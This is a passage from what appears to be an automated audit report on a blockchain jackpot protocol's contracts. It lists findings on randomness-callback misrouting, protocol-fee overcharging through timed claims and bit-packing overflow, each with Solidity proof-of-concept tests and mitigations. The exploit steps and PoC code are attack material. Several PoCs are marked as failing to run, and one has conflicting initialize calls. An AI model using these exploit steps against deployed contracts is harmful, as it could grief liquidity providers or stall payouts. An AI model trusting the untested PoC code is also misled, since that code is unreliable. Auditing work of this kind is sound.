        uint256[TOTAL_TIERS] memory weights;
        // Allocate 100% premium weight to jackpot tier (11) so a single jackpot winner gets non-zero payout when snapshot exists
        weights[11] = PRECISE_UNIT;
        pc1 = new GuaranteedMinimumPayoutCalculator(IJackpot(JACKPOT), 0, 0, minTiers, weights);
        pc2 = new GuaranteedMinimumPayoutCalculator(IJackpot(JACKPOT), 0, 0, minTiers, weights);
    }

    // 1) Settlement on swapped-in calculator without snapshot => zero payouts
    function test_SettlementOnNewCalculatorWithoutSnapshotPaysZero() public {
        uint256 drawingId = 1;
        uint256 prizePool = 1_000e6; // 1,000 USDC
        uint256[] memory unique = new uint256[](TOTAL_TIERS);
        uint256[] memory dup = new uint256[](TOTAL_TIERS);

        // Indicate a jackpot-tier user winner exists
        unique[11] = 1;

        // Emulate Jackpot settlement on the new calculator (pc2) which has no snapshot for drawingId
        vm.prank(JACKPOT);
        uint256 total = pc2.calculateAndStoreDrawingUserWinnings(
            drawingId,
            prizePool,
            35,
            10,
            unique,
            dup
        );

        assertEq(total, 0, "total payout should be zero when snapshot is missing on swapped-in calculator");
        assertEq(pc2.getTierPayout(drawingId, 11), 0, "tier payout should be zero when snapshot is missing");
    }

    // 2) Settlement on original calculator, then swap => claims read from wrong calculator return 0
    function test_ClaimsBreakIfCalculatorSwappedAfterSettlement() public {
        uint256 drawingId = 2;
        uint256 prizePool = 1_000e6; // 1,000 USDC
        uint256[] memory unique = new uint256[](TOTAL_TIERS);
        uint256[] memory dup = new uint256[](TOTAL_TIERS);
        unique[11] = 1; // one jackpot-tier winner

        // Snapshot and settle using the original calculator (pc1)
        vm.startPrank(JACKPOT);
        pc1.setDrawingTierInfo(drawingId);
        uint256 total = pc1.calculateAndStoreDrawingUserWinnings(
            drawingId,
            prizePool,
            35,
            10,
            unique,
            dup
        );
        vm.stopPrank();

        // With 100% weight on tier 11 and exactly 1 total winner, the per-ticket payout equals the entire prizePool
        assertEq(total, prizePool, "pc1 should allocate full prize pool to the single jackpot winner");
        assertEq(pc1.getTierPayout(drawingId, 11), prizePool, "pc1 stored the tier payout for the drawing");

        // If governance swaps to pc2 for subsequent drawings, claimWinnings (which reads current payoutCalculator)
        // would query pc2 which has no data for this drawing and return 0
        assertEq(pc2.getTierPayout(drawingId, 11), 0, "new calculator has no record for prior drawing; claims would read 0");
    }
}


## Suggested Mitigation
Implement both a correctness guard and architectural binding:

1) Snapshot integrity guard in GuaranteedMinimumPayoutCalculator:
- In calculateAndStoreDrawingUserWinnings(), verify that a snapshot exists for _drawingId by requiring sum(drawingTierInfo[_drawingId].premiumTierWeights) == PRECISE_UNIT; otherwise revert (e.g., SnapshotMissing()). This prevents silent zero-payout settlements when snapshots are missing.

2) Per-drawing calculator binding in Jackpot:
- When initializing a new drawing in _setNewDrawingState(), persist the active payout calculator to a mapping: payoutCalculatorForDrawing[drawingId] = payoutCalculator, immediately before calling setDrawingTierInfo(drawingId).
- Use payoutCalculatorForDrawing[drawingId] for:
  a) Settlement: call payoutCalculatorForDrawing[currentDrawingId].calculateAndStoreDrawingUserWinnings(...)
  b) Claims: read payouts via payoutCalculatorForDrawing[drawingId].getTierPayout(drawingId, tierId)
- Optionally disallow setPayoutCalculator while a drawing is active (or make it effective only for the next drawing) to reduce operator error.

These changes fully eliminate both failure modes (mid-drawing swap and post-settlement swap) and ensure past drawings remain readable regardless of future calculator upgrades.





 **Derived From** : pending[sequence].callback == msg.sender && pending[sequence].selector == _selector && keccak256(pending[sequence].context) == keccak256(_context) && pending[sequence].setRequests.length == _requests.length && for all i: pending[sequence].setRequests[i].minRange == _requests[i].minRange && pending[sequence].setRequests[i].maxRange == _requests[i].maxRange && pending[sequence].setRequests[i].samples == _requests[i].samples && pending[sequence].setRequests[i].withReplacement == _requests[i].withReplacement

## [M-13]. Cross-provider sequence collision misroutes callbacks due to pending keyed only by sequence, leading to DoS/misbinding after provider rotation

### Finding Severity Justification: Pending entropy requests are keyed only by sequence while Pyth sequences are per-provider. After an owner-initiated provider rotation, a new request from the new provider can reuse an existing sequence number and overwrite the pending entry. This causes the old provider’s callback to be misrouted and the intended consumer to miss its callback, reverting later with UnknownSequence(). Impact is a realistic denial-of-service and misbinding of randomness rather than direct fund loss, aligning with Medium per Code4rena rubric (availability/function disruption).
## Derived From Pattern/Invariant
pending[sequence].callback == msg.sender && pending[sequence].selector == _selector && keccak256(pending[sequence].context) == keccak256(_context) && pending[sequence].setRequests.length == _requests.length && for all i: pending[sequence].setRequests[i].minRange == _requests[i].minRange && pending[sequence].setRequests[i].maxRange == _requests[i].maxRange && pending[sequence].setRequests[i].samples == _requests[i].samples && pending[sequence].setRequests[i].withReplacement == _requests[i].withReplacement

## Exploit Type
StorageLayout

## Location
ScaledEntropyProvider.requestAndCallbackScaledRandomness

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
ScaledEntropyProvider indexes pending requests only by `sequence` and ignores the provider dimension both in storage and during callback. If the owner rotates `entropyProvider` while there are pending requests, the Pyth Entropy sequence numbers (unique per provider, not globally) can collide. The later request to the new provider overwrites `pending[sequence]` of an earlier request to the old provider. When Pyth calls back for the old request, the contract reads `pending[sequence]` (now containing the new request), deletes it, and invokes the new request's callback with the old request's random number. The subsequent callback for the new request then reverts with UnknownSequence(). This breaks the referential invariant (pending no longer mirrors the original inputs/binding) and can brick downstream consumers (e.g., jackpot stays locked or settles with mismatched randomness).

Vulnerable snippets:
- Storage keyed only by sequence:
  mapping(uint64 => PendingRequest) private pending;

- Provider ignored on callback and pending fetched by sequence only:
  function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override {
      PendingRequest memory req = pending[sequence];
      if (req.callback == address(0)) revert UnknownSequence();
      delete pending[sequence];
      ... req.callback.call(...)
  }

- Pending write lacks provider namespace:
  function _storePendingRequest(uint64 sequence, ...) internal {
      pending[sequence].callback = msg.sender;
      ...
      pending[sequence].setRequests.push(_setRequests[i]);
  }

## Impact
Provider rotation during normal operations can misroute randomness to the wrong callback and permanently invalidate the intended request (UnknownSequence on legitimate callback). Downstream protocols relying on the callback (e.g., jackpot settlement) may get stuck or settle with mismatched randomness, causing denial of service and fairness violations.

## Command to Run Test


## Proof of Concept
1) A pending request is created with provider A; Pyth assigns sequence=1 and ScaledEntropyProvider stores pending[1].
2) Owner rotates `entropyProvider` to provider B (a valid operational action).
3) A second request is created with provider B; Pyth also assigns sequence=1 (sequence numbers are per-provider). ScaledEntropyProvider overwrites pending[1] with the new request.
4) Pyth first calls back for (provider A, seq=1): ScaledEntropyProvider reads pending[1] (now the B-request), deletes it, and calls the B-request's callback with A's random number.
5) Pyth later calls back for (provider B, seq=1): pending[1] is gone, causing UnknownSequence() and the intended consumer never receives its randomness. The initial consumer also never received its callback. The referential binding between request and callback is broken, and the system can be stuck.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {ScaledEntropyProvider} from "contracts/ScaledEntropyProvider.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";
import {IEntropyV2} from "@pythnetwork/entropy-sdk-solidity/IEntropyV2.sol";
import {IEntropyConsumer} from "@pythnetwork/entropy-sdk-solidity/IEntropyConsumer.sol";
import {EntropyStructsV2} from "@pythnetwork/entropy-sdk-solidity/EntropyStructsV2.sol";

contract MockEntropy is IEntropyV2 {
    mapping(address => uint64) public seq;

    function requestV2() external payable returns (uint64) { revert(); }
    function requestV2(uint32) external payable returns (uint64) { revert(); }
    function requestV2(address provider, uint32) external payable returns (uint64 assignedSequenceNumber) {
        assignedSequenceNumber = ++seq[provider];
    }
    function requestV2(address, bytes32, uint32) external payable returns (uint64) { revert(); }

    function getProviderInfoV2(address) external view returns (EntropyStructsV2.ProviderInfo memory info) { revert(); }
    function getDefaultProvider() external view returns (address provider) { return address(0); }
    function getRequestV2(address, uint64) external view returns (EntropyStructsV2.Request memory req) { revert(); }
    function getFeeV2() external view returns (uint128) { return 1e12; }
    function getFeeV2(uint32) external view returns (uint128) { return 1e12; }
    function getFeeV2(address, uint32) external view returns (uint128) { return 1e12; }

    // Simulate Pyth calling the consumer's callback. msg.sender == address(this), which SEP trusts as entropy.
    function trigger(address consumer, address provider, uint64 sequence, bytes32 rnd) external {
        IEntropyConsumer(consumer)._entropyCallback(sequence, provider, rnd);
    }
}

contract DummyTarget {
    uint256 public calls;
    uint64  public lastSeq;
    uint256 public lastFirstNum;

    event Got(uint64 seq, uint256[][] nums, bytes ctx);

    function callProvider(ScaledEntropyProvider sep, uint32 gasLimit, bytes memory ctx) external payable returns (uint64) {
        IScaledEntropyProvider.SetRequest[] memory reqs = new IScaledEntropyProvider.SetRequest[](1);
        reqs[0] = IScaledEntropyProvider.SetRequest({
            samples: 1,
            minRange: 1,
            maxRange: 10,
            withReplacement: true
        });
        return sep.requestAndCallbackScaledRandomness{value: msg.value}(gasLimit, reqs, this.onRandom.selector, ctx);
    }

    function onRandom(uint64 seq, uint256[][] memory nums, bytes memory ctx) external {
        calls++;
        lastSeq = seq;
        if (nums.length > 0 && nums[0].length > 0) lastFirstNum = nums[0][0];
        emit Got(seq, nums, ctx);
    }
}

contract SequenceCollisionTest is Test {
    MockEntropy entropy;
    ScaledEntropyProvider sep;
    address providerA = address(0xA11CE);
    address providerB = address(0xB0B);

    function setUp() public {
        entropy = new MockEntropy();
        sep = new ScaledEntropyProvider(address(entropy), providerA);
    }

    function testProviderRotationSequenceCollisionBreaksReferentialBinding() public {
        DummyTarget t1 = new DummyTarget();
        DummyTarget t2 = new DummyTarget();
        vm.deal(address(t1), 1 ether);
        vm.deal(address(t2), 1 ether);

        uint32 gasLimit = 200000;
        uint128 feeA = entropy.getFeeV2(providerA, gasLimit);
        uint128 feeB = entropy.getFeeV2(providerB, gasLimit);

        // First request on provider A => seqA = 1
        vm.prank(address(t1));
        uint64 seqA = t1.callProvider{value: feeA}(sep, gasLimit, abi.encode("first"));
        assertEq(seqA, 1, "seqA should be 1");

        // Rotate provider to B (owner-only; test contract is owner per constructor)
        sep.setEntropyProvider(providerB);

        // Second request on provider B => seqB = 1 (collision on sequence key)
        vm.prank(address(t2));
        uint64 seqB = t2.callProvider{value: feeB}(sep, gasLimit, abi.encode("second"));
        assertEq(seqB, 1, "seqB should be 1 (collision)");

        // Callback arrives for (A,1): will read pending[1] (now overwritten by B's request),
        // invoke t2.onRandom, and delete pending[1]
        entropy.trigger(address(sep), providerA, seqA, keccak256("RA"));
        assertEq(t1.calls(), 0, "t1 never received its callback");
        assertEq(t2.calls(), 1, "t2 incorrectly received A's callback");
        assertEq(t2.lastSeq(), 1, "seq delivered to t2 should be 1");

        // Now callback for (B,1) reverts with UnknownSequence since pending[1] was deleted
        vm.expectRevert(ScaledEntropyProvider.UnknownSequence.selector);
        entropy.trigger(address(sep), providerB, seqB, keccak256("RB"));
    }
}


## Suggested Mitigation
Namespace pending requests by provider to avoid cross-provider sequence collisions and validate the provider on callback. Recommended changes: 1) Storage: use mapping(address => mapping(uint64 => PendingRequest)) pending; and optionally track per-provider pending counts. 2) Store provider used at request time (e.g., local variable p = entropyProvider) and write to pending[p][sequence]. 3) In entropyCallback(sequence, provider, randomNumber), look up PendingRequest memory req = pending[provider][sequence]; require(req.callback != address(0), otherwise revert UnknownSequence(); then delete pending[provider][sequence] before processing to prevent reentrancy/replay. 4) Defense-in-depth: delete pending[provider][sequence].setRequests (or delete whole struct) before writing in _storePendingRequest to avoid stale array data if the same (provider,sequence) entry is ever reused. 5) Operationally, consider blocking provider rotation while there are nonzero pending requests for the current provider (or require rotation only when pendingCount == 0) to simplify operations. Optionally, cross-check provider/sequence with IEntropyV2.getRequestV2(provider, sequence) to ensure the callback corresponds to a request initiated by this contract.





 **Derived From** : for every _requests[i] with withReplacement == false: _requests[i].samples <= (_requests[i].maxRange - _requests[i].minRange + 1) (else revert)

## [L-14]. Invalid non-replacement sample counts accepted at request-time cause callback revert, stuck pending entry, and fee loss

### Finding Severity Justification: The missing validation can cause the callback to revert, leaving a pending request and wasting the paid entropy fee. However, in MegaPot this can only be triggered by the trusted Jackpot contract passing invalid parameters (e.g., normalBallMax < 5 for a 5-sample no-replacement draw), which constitutes admin misconfiguration contrary to spec. Users cannot induce this path. Impact is functional DoS of that request/sequence and fee loss, but requires governance misuse; therefore QA/Low per Code4rena guidelines.
## Derived From Pattern/Invariant
for every _requests[i] with withReplacement == false: _requests[i].samples <= (_requests[i].maxRange - _requests[i].minRange + 1) (else revert)

## Exploit Type
IntegerMath

## Location
ScaledEntropyProvider.requestAndCallbackScaledRandomness

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
ScaledEntropyProvider.requestAndCallbackScaledRandomness stores requests without enforcing the Fisher-Yates constraint for non-replacement draws. _validateRequests() only checks min<=max and samples>0, but does not ensure samples <= (max-min+1). The actual require is only enforced inside FisherYatesRejection.draw during entropyCallback, which runs later. As a result, an invalid request is accepted and fee paid up-front; on callback, entropyCallback -> _getScaledRandomness -> FisherYatesRejection.draw reverts with "Too many draws". Because the delete pending[sequence] happens before generation and the entire callback reverts, the pending entry remains stuck and the randomness is never delivered. This wastes the paid fee and causes a functional DoS for that sequence. If a protocol like Jackpot passes such an invalid request, the drawing stays locked until a new valid request is made.

## Impact
Accepting invalid non-replacement sample counts leads to a guaranteed revert during entropyCallback, which leaves the pending entry intact and the randomness undelivered for that sequence. Economic impact: the ETH entropy fee is irrecoverably paid to the entropy provider at request time. Functional impact on Megapot: a drawing can become stuck (jackpotLock remains true and settlement never occurs) only if the trusted integrator (Jackpot) misconfigures the request (e.g., normalBallMax < 5 for a 5-sample no-replacement draw). Third parties calling ScaledEntropyProvider with invalid params cannot DoS Jackpot because callbacks target msg.sender; they only lose their own fee and create a stale pending entry. Thus, the protocol-level DoS requires governance misconfiguration; otherwise the effect is limited to the caller’s fee loss and minor storage growth.

## Command to Run Test


## Proof of Concept
Unchanged

## Proof of Code
Unchanged

## Suggested Mitigation
Unchanged





 **Derived From** : (drawingState[prevDrawingId].lpEarnings - drawingUserWinnings) <= protocolFeeThreshold ? protocolFeeAmount == 0 : protocolFeeAmount == (drawingState[prevDrawingId].lpEarnings - drawingUserWinnings - protocolFeeThreshold) * protocolFee / PRECISE_UNIT

## [M-15]. Cross‑drawing misattribution lets any winner spike lpEarnings right before settlement and overcharge protocol fee

### Finding Severity Justification: Referrer-less winners can time their claim to inflate the current drawing’s lpEarnings just before settlement, causing protocol fees to be charged on profits not attributable to the current drawing’s ticket revenue. This harms LP economics (fees taken from LP pool) but does not let the attacker steal funds. Impact is real for LPs and can be non-trivial if large claims are timed; however the attacker doesn't profit directly, making it a Medium severity economic correctness issue.
## Derived From Pattern/Invariant
(drawingState[prevDrawingId].lpEarnings - drawingUserWinnings) <= protocolFeeThreshold ? protocolFeeAmount == 0 : protocolFeeAmount == (drawingState[prevDrawingId].lpEarnings - drawingUserWinnings - protocolFeeThreshold) * protocolFee / PRECISE_UNIT

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot.scaledEntropyCallback

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In scaledEntropyCallback, the protocol fee base is computed as (currentDrawingState.lpEarnings − drawingUserWinnings). However, claimWinnings credits referrerless winners’ referral share to the current drawing’s lpEarnings at claim-time, not at the winning drawing, via:

function _payReferrersWinnings(...)
{
    uint256 referrerShare = _winningAmount * _referralWinShare / PRECISE_UNIT;
    if (_referralSchemeId == bytes32(0)) {
        drawingState[currentDrawingId].lpEarnings += referrerShare; // misattributed to current drawing
        emit LpEarningsUpdated(currentDrawingId, referrerShare);
        return referrerShare;
    }
    ...
}

Then in scaledEntropyCallback the protocol fee is charged on that inflated lpEarnings:

function _transferProtocolFee(uint256 _lpEarnings, uint256 _drawingUserWinnings) internal returns (uint256 protocolFeeAmount) {
    if (_lpEarnings > _drawingUserWinnings && _lpEarnings - _drawingUserWinnings > protocolFeeThreshold) {
        protocolFeeAmount = (_lpEarnings - _drawingUserWinnings - protocolFeeThreshold) * protocolFee / PRECISE_UNIT;
        usdc.safeTransfer(protocolFeeAddress, protocolFeeAmount);
    }
    emit ProtocolFeeCollected(currentDrawingId, protocolFeeAmount);
}

Any referrerless winner from a past drawing can wait until the current drawing, and just before settlement, call claimWinnings so that their referrer share (which is deducted from their payout) is added to the current drawing’s lpEarnings. This artificially increases (lpEarnings − userWinnings) for the current drawing and can flip it over the threshold, causing an otherwise non-payable or smaller protocol fee to be charged to LPs. The attacker does not receive these fees; the loss is borne by LPs. This violates the economic intent of the invariant by mixing previous drawing revenues into the current drawing’s arithmetic basis.

## Impact
Referrer-less winners can time their claims to inflate the current drawing’s lpEarnings immediately before settlement, causing the protocol to charge a fee on profits that did not originate from the current drawing’s ticket revenue. This lets any winner grief LPs by selecting a drawing with low userWinnings to maximize (lpEarnings − userWinnings), push it over the threshold, and extract protocol fees from the LP pool. The attacker does not profit directly, but LPs can lose up to protocolFee × (referrerShare − threshold) per such timed claim. This effect scales with the size of unclaimed, referrer-less winnings and non-zero referralWinShare, and systematically misattributes prior-drawing economics to the current drawing.

## Command to Run Test


## Proof of Concept
Preconditions: referralWinShare > 0 (non-zero), protocolFee > 0, protocolFeeThreshold set small. Have a past drawing with a referrer-less winning ticket whose referrerShare is substantial.

Steps:
1) Complete Drawing N with a large referrer-less winner. Do not claim yet. This sets the drawing’s user winnings but the winner has not been paid (net payout will be reduced by referrerShare on claim).
2) Advance to Drawing N+1. Ensure little/no ticket revenue so drawingUserWinnings ≈ 0.
3) Just before settling Drawing N+1, the past winner calls claimWinnings. Because the ticket had no referral scheme, _payReferrersWinnings credits referrerShare to drawingState[currentDrawingId].lpEarnings (i.e., N+1), even though the win belongs to N.
4) Settle Drawing N+1. The protocol computes the fee base as (lpEarnings − drawingUserWinnings) for N+1, which is now inflated by the old referrerShare. If above threshold, _transferProtocolFee takes protocol fees from the pool that are not attributable to N+1’s ticket revenue.
5) Result: Protocol fees are charged to LPs due to cross-drawing misattribution, while the winner’s net payout is unchanged. The attacker times the claim to maximize fees extracted from LPs.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {Jackpot} from "contracts/Jackpot.sol";
import {JackpotLPManager} from "contracts/JackpotLPManager.sol";
import {JackpotTicketNFT} from "contracts/JackpotTicketNFT.sol";
import {GuaranteedMinimumPayoutCalculator} from "contracts/GuaranteedMinimumPayoutCalculator.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";
import {IJackpotTicketNFT} from "contracts/interfaces/IJackpotTicketNFT.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";

contract MockUSDC {
    string public name = "MockUSDC";
    string public symbol = "USDC";
    uint8 public decimals = 6;
    mapping(address=>uint256) public balanceOf;
    mapping(address=>mapping(address=>uint256)) public allowance;
    event Transfer(address indexed from,address indexed to,uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);
    function mint(address to, uint256 amt) external { balanceOf[to]+=amt; emit Transfer(address(0),to,amt);}    
    function approve(address s, uint256 a) external returns(bool){ allowance[msg.sender][s]=a; emit Approval(msg.sender,s,a); return true; }
    function transfer(address to, uint256 a) external returns(bool){ require(balanceOf[msg.sender]>=a); balanceOf[msg.sender]-=a; balanceOf[to]+=a; emit Transfer(msg.sender,to,a); return true; }
    function transferFrom(address f,address t,uint256 a) external returns(bool){ require(balanceOf[f]>=a && allowance[f][msg.sender]>=a); allowance[f][msg.sender]-=a; balanceOf[f]-=a; balanceOf[t]+=a; emit Transfer(f,t,a); return true; }
}

contract ProtocolFeeCrossDrawingManipulationTest is Test {
    MockUSDC usdc;
    Jackpot jackpot;
    JackpotLPManager lpMgr;
    JackpotTicketNFT nft;
    GuaranteedMinimumPayoutCalculator payout;

    address owner = address(this);
    address entropy = address(0xE);
    address lp = address(0xA);
    address player = address(0xB);
    address protoFee = address(0xFEE);

    uint256 constant PRECISE_UNIT = 1e18;

    function setUp() public {
        usdc = new MockUSDC();
        // Jackpot params (kept simple for test)
        uint256 drawingDuration = 1;
        uint8 normalMax = 5; // choose(5,5)=1 makes jackpot tier easy
        uint8 bonusMin = 1;
        uint256 lpEdgeTarget = 1e16; // 1%
        uint256 reserveRatio = 0; // full LP value in prize pool
        uint256 referralFee = 0; // no purchase referral fee
        uint256 referralWinShare = PRECISE_UNIT; // 100% to LP if no referral
        uint256 protocolFee = 1e17; // 10%
        uint256 protocolFeeThreshold = 1e6; // 1 USDC
        uint256 ticketPrice = 1e6; // 1 USDC
        uint256 maxReferrers = 3;
        uint32 entropyBaseGas = 0;

        jackpot = new Jackpot(
            drawingDuration, normalMax, bonusMin, lpEdgeTarget, reserveRatio,
            referralFee, referralWinShare, protocolFee, protocolFeeThreshold,
            ticketPrice, maxReferrers, entropyBaseGas
        );
        lpMgr = new JackpotLPManager(IJackpot(address(jackpot)));
        nft = new JackpotTicketNFT(IJackpot(address(jackpot)));

        // Payout calculator: weight everything to jackpot tier (11)
        bool[12] memory minTiers;
        uint256[12] memory weights;
        weights[11] = PRECISE_UNIT;
        payout = new GuaranteedMinimumPayoutCalculator(IJackpot(address(jackpot)), 0, 0, minTiers, weights);

        // Wire deps
        jackpot.initialize(IScaledEntropyProvider(address(entropy)), payout, IJackpotLPManager(address(lpMgr)), IJackpotTicketNFT(address(nft)), IERC20(address(usdc)));
        // Note: The actual Jackpot.initialize signature in provided code is (IERC20, IJackpotLPManager, IJackpotTicketNFT, IScaledEntropyProvider, IPayoutCalculator).
        // Some repos revert param order; adjust if needed:
        // jackpot.initialize(IERC20(address(usdc)), lpMgr, nft, IScaledEntropyProvider(address(entropy)), payout);

        // Use the canonical order from the provided Jackpot.sol:
        jackpot.initialize(IERC20(address(usdc)), lpMgr, nft, IScaledEntropyProvider(address(entropy)), payout);

        jackpot.setProtocolFeeAddress(protoFee);

        // Initialize LP deposits system and caps
        jackpot.initializeLPDeposits(1_000_000e6);

        // Seed balances
        usdc.mint(lp, 2_000e6);
        vm.prank(lp);
        usdc.approve(address(jackpot), type(uint256).max);

        // LP deposit 1,000 USDC into drawing 0
        vm.prank(lp);
        jackpot.lpDeposit(1_000e6);

        // Initialize jackpot drawing 1
        jackpot.initializeJackpot(block.timestamp + 1);
        // Advance time so drawing 1 can be settled
        vm.warp(block.timestamp + 2);

        // Player funds
        usdc.mint(player, 10e6);
        vm.prank(player);
        usdc.approve(address(jackpot), type(uint256).max);
    }

    function test_ProtocolFee_Overcharged_By_CrossDrawingClaim() public {
        // Player buys 1 ticket in drawing 1 with no referral (referralScheme empty)
        IJackpot.Ticket[] memory tickets = new IJackpot.Ticket[](1);
        uint8[] memory normals = new uint8[](5);
        normals[0]=1; normals[1]=2; normals[2]=3; normals[3]=4; normals[4]=5;
        tickets[0] = IJackpot.Ticket({normals: normals, bonusball: 1});
        vm.prank(player);
        jackpot.buyTickets(tickets, player, new address[](0), new uint256[](0), bytes32("src"));

        // Manually lock and settle drawing 1 with winning numbers matching the player's ticket (jackpot)
        jackpot.lockJackpot();
        uint256[][] memory rng = new uint256[][](2);
        rng[0] = new uint256[](5); rng[0][0]=1; rng[0][1]=2; rng[0][2]=3; rng[0][3]=4; rng[0][4]=5;
        rng[1] = new uint256[](1); rng[1][0]=1;
        // Call as entropy provider
        vm.prank(entropy);
        jackpot.scaledEntropyCallback(bytes32(0), rng, "");
        // Now currentDrawingId == 2

        // Sanity: protocol fee balance is 0 before any next settlement
        assertEq(usdc.balanceOf(protoFee), 0, "pre proto fee bal");

        // For drawing 2: no ticket sales => userWinnings == 0, lpEarnings starts at 0
        // The attacker claims the drawing 1 winning ticket just before settling drawing 2.
        IJackpotTicketNFT.ExtendedTrackedTicket[] memory lst = nft.getUserTickets(player, 1);
        uint256[] memory ids = new uint256[](1); ids[0] = lst[0].ticketId;
        vm.prank(player);
        jackpot.claimWinnings(ids); // pushes referrerShare to drawing 2 lpEarnings

        // Lock and settle drawing 2; userWinnings = 0, lpEarnings > threshold due to the above claim => protocol fee charged
        jackpot.lockJackpot();
        uint256[][] memory rng2 = new uint256[][](2);
        rng2[0] = new uint256[](5); rng2[0][0]=1; rng2[0][1]=2; rng2[0][2]=3; rng2[0][3]=4; rng2[0][4]=5;
        rng2[1] = new uint256[](1); rng2[1][0]=1;
        vm.prank(entropy);
        jackpot.scaledEntropyCallback(bytes32(0), rng2, "");

        // Assert protocol fee was collected (balance > 0). Without the pre-settlement claim, it would be 0.
        assertGt(usdc.balanceOf(protoFee), 0, "protocol fee wrongly zero");
    }
}


## Suggested Mitigation
Exclude cross-drawing claim-time LP credits from the current drawing’s protocol-fee base, or attribute them to the original (winning) drawing:

Option A (correct attribution):
- In claimWinnings, pass the ticket’s drawingId into _payReferrersWinnings and credit referrerShare to drawingState[drawingId].lpEarnings instead of drawingState[currentDrawingId].lpEarnings. This keeps each drawing’s economics self-contained and prevents fee base distortion.

Option B (fee-base separation):
- Track two accumulators per drawing: (1) lpEarningsFromTicketSales (updated only in buyTickets), and (2) lpClaimCredits (from referrer-less claims). During settlement:
  • Compute protocol fee using max(0, lpEarningsFromTicketSales − drawingUserWinnings − protocolFeeThreshold) × protocolFee / 1e18.
  • For LP roll-forward to the next drawing, use total lpEarnings = lpEarningsFromTicketSales + lpClaimCredits so LP remains whole.

Either approach ensures protocol fees are charged only on the current drawing’s realized ticket-profit, not on retroactive credits from past drawings.





 **Derived From** : drawingState[currentDrawingId].ballMax + drawingState[currentDrawingId].bonusballMax <= MAX_BIT_VECTOR_SIZE && drawingState[currentDrawingId].bonusballMax >= bonusballMin

## [L-16]. Bit-packing overflow lets bonusball bit vanish, causing claim DoS/underpayment when ballMax + bonusballMax > 255

### Finding Severity Justification: Impact would be high (claim DoS/underpayment), but it requires an owner-set misconfiguration where bonusballMin > (255 − normalBallMax). Admins are trusted and this is a configuration footgun. Per Code4rena rules, bugs only reachable via admin misuse are governance/QA-level.
## Derived From Pattern/Invariant
drawingState[currentDrawingId].ballMax + drawingState[currentDrawingId].bonusballMax <= MAX_BIT_VECTOR_SIZE && drawingState[currentDrawingId].bonusballMax >= bonusballMin

## Exploit Type
IntegerMath

## Location
Jackpot.scaledEntropyCallback

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
New drawing’s bonusballMax is computed in _setNewDrawingState and stored during scaledEntropyCallback without enforcing ballMax + bonusballMax ≤ 255. TicketComboTracker packs the bonusball at bit (normalMax + bonusball): ticketNumbers = set | (1 << (_bonusball + _tracker.normalMax)). If (normalMax + bonusball) ≥ 256, the shift zeros out the bonusball bit. Later, _calculateTicketTierId treats ticketBonusball == winningBonusball (both 0) as a match and subtracts 1 from popCount of normal matches, which reverts for 0 normal matches (underflow) and mis-tiers for >0 matches (systematically underpaying winners). Vulnerable sites:

- Jackpot._setNewDrawingState:
  uint8 newBonusball = uint8(Math.max(bonusballMin, Math.ceilDiv(minNumberTickets, combosPerBonusball)));
  newDrawingState.bonusballMax = newBonusball;

- TicketComboTracker.insert:
  ticketNumbers = set |= 1 << (_bonusball + _tracker.normalMax);

- Jackpot._calculateTicketTierId:
  uint256 ticketBonusball = _ticketNumbers >> (_normalBallMax + 1);
  uint256 winningBonusball = _winningNumbers >> (_normalBallMax + 1);
  uint256 bonusballMatch = (ticketBonusball == winningBonusball) ? 1 : 0;
  return 2 * (matches - bonusballMatch) + bonusballMatch;

Because bonusballMin is admin-set with no upper bound against (255 - normalBallMax), the next drawing can be initialized with an invalid packing space. This corrupts all tickets in that drawing: many claims revert (0 normal matches) or are underpaid (bonusball assumed matched).

## Impact
If normalBallMax + bonusballMax exceeds 255, the bonusball bit is packed beyond the 256-bit boundary and becomes zero. When both the winning ticket and a user ticket lack a bonusball bit due to this overflow, _calculateTicketTierId interprets the bonusball as matched (0 == 0) and subtracts 1 from the normal matches. This causes: (a) claim reverts for tickets with 0 normal matches (underflow), and (b) systemic mis-tiering (underpayment) for tickets with k>0 normal matches. Not all drawings/tickets are affected—only those where the overflowed bonusball value was drawn and/or stored—but the effect can DoS a subset of claims and underpay others. The issue requires an admin misconfiguration (bonusballMin chosen such that future computed bonusballMax violates the packing bound), so severity is low under governance/QA per rules.

## Command to Run Test


## Proof of Concept
Setup: An admin sets parameters such that normalBallMax + bonusballMax > 255 (e.g., normalBallMax = 128 and computed/stored bonusballMax = 128). In TicketComboTracker.insert, the packed bonusball bit is placed at position (normalMax + bonusball). For any bonusball where (normalMax + bonusball) >= 256, the shift 1 << (normalMax + bonusball) overflows and zeroes the bit. If the drawn bonusball is also in this overflowing range, both the winningTicket and ticket lack a bonusball bit. In Jackpot._calculateTicketTierId, both shifted high parts are 0, so bonusballMatch = 1. With 0 normal matches, the function computes 2*(0-1)+1, which underflows and reverts, DoSing those claims. With k>0 normal matches, the function mis-tiers to 2*(k-1)+1 (as if one fewer normal match but bonusball matched), underpaying winners.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

// Minimal harness that replicates Jackpot._calculateTicketTierId behavior
contract CalcHarness {
    function calc(uint256 _ticketNumbers, uint256 _winningNumbers, uint256 _normalBallMax) external pure returns (uint256) {
        uint256 matches = popcount(_ticketNumbers & _winningNumbers);
        uint256 ticketBonusball = _ticketNumbers >> (_normalBallMax + 1);
        uint256 winningBonusball = _winningNumbers >> (_normalBallMax + 1);
